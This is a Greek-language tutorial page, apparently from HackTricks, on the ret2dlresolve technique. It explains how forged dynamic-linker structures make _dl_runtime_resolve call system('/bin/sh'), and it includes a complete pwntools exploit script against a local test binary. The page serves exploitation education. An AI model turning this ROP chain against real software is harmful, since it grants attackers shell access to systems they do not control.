# Ret2dlresolve

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο GitHub.

</details>

## Βασικές Πληροφορίες

Όπως εξηγείται στη σελίδα για το [**GOT/PLT**](../arbitrary-write-2-exec/aw2exec-got-plt.md) και το [**Relro**](../common-binary-protections-and-bypasses/relro.md), τα δυαδικά χωρίς Full Relro θα επιλύουν σύμβολα (όπως διευθύνσεις προς εξωτερικές βιβλιοθήκες) την πρώτη φορά που χρησιμοποιούνται. Αυτή η επίλυση γίνεται καλώντας τη λειτουργία **`_dl_runtime_resolve`**.

Η λειτουργία **`_dl_runtime_resolve`** παίρνει από τη στοίβα αναφορές σε μερικές δομές που χρειάζεται για να επιλύσει το συγκεκριμένο σύμβολο.

Επομένως, είναι δυνατόν να **πλαστογραφηθούν όλες αυτές οι δομές** για να γίνει η δυναμική σύνδεση και η επίλυση του ζητούμενου συμβόλου (όπως η λειτουργία **`system`**) και να κληθεί με ρυθμισμένη παράμετρο (π.χ. **`system('/bin/sh')`**).

Συνήθως, όλες αυτές οι δομές πλαστογραφούνται με τη δημιουργία μιας **αρχικής ROP αλυσίδας που καλεί την `read`** σε μια εγγράψιμη μνήμη, στη συνέχεια οι **δομές** και η συμβολοσειρά **`'/bin/sh'`** περνιούνται ώστε να αποθηκευτούν από την read σε μια γνωστή τοποθεσία, και στη συνέχεια η ROP αλυσίδα συνεχίζει καλώντας το **`_dl_runtime_resolve`** με τη διεύθυνση προς το `$'/bin/sh'`.

{% hint style="success" %}
Αυτή η τεχνική είναι χρήσιμη ειδικά αν δεν υπάρχουν συσκευές syscall (για χρήση τεχνικών όπως το [**ret2syscall**](rop-syscall-execv.md) ή το [SROP](srop-sigreturn-oriented-programming.md)) και δεν υπάρχουν τρόποι διαρροής διευθύνσεων της libc.
{% endhint %}

Μπορείτε να βρείτε μια καλύτερη εξήγηση για αυτήν την τεχνική στο δεύτερο μισό του βίντεο:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Δομές

Είναι απαραίτητο να πλαστογραφηθούν 3 δομές: **`JMPREL`**, **`STRTAB`** και **`SYMTAB`**. Έχετε μια καλύτερη εξήγηση για το πώς χτίζονται αυτές στο [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures)

## Σύνοψη Επίθεσης

1. Γράψτε ψεύτικες δομές σε κάποιο μέρος
2. Ορίστε τον πρώτο ορισμό του συστήματος (`$rdi = &'/bin/sh'`)
3. Ορίστε στη στοίβα τις διευθύνσεις προς τις δομές για να κληθεί το **`_dl_runtime_resolve`**
4. Κλήση του **`_dl_runtime_resolve`**
5. Το **`system`** θα επιλυθεί και θα κληθεί με το `'/bin/sh'` ως όρισμα

## Παράδειγμα

Μπορείτε να βρείτε ένα [**παράδειγμα αυτής της τεχνικής εδώ**](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) **περιλαμβάνοντας μια πολύ καλή εξήγηση της τελικής ROP αλυσίδας**, αλλά εδώ είναι η τελική εκμετάλλευση που χρησιμοποιήθηκε:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
## Αναφορές

* [https://youtu.be/ADULSwnQs-s](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
